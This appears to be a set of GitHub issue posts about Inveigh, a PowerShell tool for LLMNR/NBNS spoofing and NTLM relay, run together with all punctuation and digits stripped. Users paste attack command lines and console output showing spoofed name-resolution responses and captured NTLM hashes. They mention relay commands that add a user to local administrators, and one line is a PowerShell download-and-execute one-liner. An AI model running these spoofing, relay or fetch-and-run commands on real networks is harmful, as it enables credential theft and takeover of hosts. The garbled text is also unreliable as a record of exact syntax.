 PS C Windows System spool drivers color InvokeInveigh ConsoleOutput Y NBNS Y mDNS Y HTTPS Y Proxy Y NBNSTypes B C MachineAccounts Y InvokeInveigh Cannot validate argument on parameter NBNSTypes The argument B C does not belong to the set B C D E specified by the ValidateSet attribute Supply an argument that is in the set and then try the command again At line char InvokeInveigh ConsoleOutput Y NBNS Y mDNS Y HTTPS Y Proxy Y NBNSTypes CategoryInfo InvalidData InvokeInveigh ParameterBindingValidationException FullyQualifiedErrorId ParameterArgumentValidationErrorInvokeInveigh Using the command line options PS C InvokeInveigh ConsoleOutput Y NBNS Y mDNS Y HTTPS Y Proxy Y NBNSTypes B MachineAccounts Y EvadeRG N Inveigh will still drop requests T NBNS request for ASDF B received from NBNS type disabled T NBNS request for ASDF B received from NBNS type disabled T LLMNR request for ASDF received from response sent WARNING T NBNS request for received from possible ResponderGuard request ignored Hi Ive pretty much mimicked the setup in the Wiki and ran the commands from the example section from InvokeInveighRelay Both commands execute fine and when I try to authenticate to the attacking host where Inveigh runs I do see the authentication and the NTLM hash However the commands set Net user add net localgroup administrators add are never run Any idea as to what I am missing Both the machine running InvokeInveighRelay and the machine I am targetting are Windows Best Kim With build e running on Windows Server R Standard Service Pack x with powershell version PS C Windows system PSVersionTablePSVersion Major Minor Build Revision When specifying more than one NBNSType as with the following oneliner powershell IEX NewObject NetWebClientDownloadString InvokeInveigh ConsoleOutput Y FileOutput Y LLMNR Y mDNS Y NBNS Y NBNSTypes I consistently receive an error InvokeInveigh Cannot validate argument on parameter NBNSTypes The argument does not belong to the set B C D E specified by the ValidateSet attribute Supply an argument that is in the set and then try the command again At line char S Y NBNSTypes CategoryInfo InvalidData InvokeInveigh ParameterBindingValidationException FullyQualifiedErrorId ParameterArgumentValidationErrorInvokeInveigh It will always work with a single specified nbnstype Ivet tried wrapping the nbnstype list in quotes but it does not seem to make a difference InvokeInveighRelay was working perfectly but now gets stuck on Performing DNS lookups on any hostname targets There are no hostname targets Hello and thank you for this great tool Im facing a problem when trying to MITM the LLMNR requests through Inveigh I use it with default settings but what it happens at testing T LLMNR request for ppppppp received from Response Sent T LLMNR request for ppppppp received from Response Sent And I never receive the SMB challenge Is that problem has something to do with firewall I use Inveigh in elevated privileges Hi Thank you for creating such a tool While using InveighRelay I noticed that it doesnt accept SMB to SMB Relay From the description InveighRelay does NTLMv NTLMv HTTPHTTPSProxy to SMB SMB The idea is similar this article using Metasploit module SMBRelay AJ